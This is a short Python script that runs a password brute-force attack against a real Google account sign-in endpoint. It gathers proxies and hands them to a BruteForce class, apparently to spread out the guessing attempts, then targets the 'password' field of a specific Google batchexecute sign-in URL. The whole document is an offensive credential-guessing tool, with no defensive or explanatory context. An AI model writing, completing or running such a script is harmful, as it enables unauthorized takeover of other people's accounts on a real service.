from core.proxy import Proxy;
from core.attack import BruteForce;
import json;

proxy = Proxy();
proxies = proxy.getProxies();

uri = "https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=B4hajb&source-path=%2Fv3%2Fsignin%2Fchallenge%2Fpwd&f.sid=3911093624726324138&bl=boq_identityfrontendauthuiserver_20240310.08_p0&hl=en-gb&TL=AEzbmxyPgvS_mpVs1NwmeyUuMVVAXOf7N2r3Nbh4uC90N7DPukmiQOwlIj7hNpdg&_reqid=856277&rt=c";
bruteforce = BruteForce(uri, proxies);

bruteforce.setKey("password");
bruteforce.execute();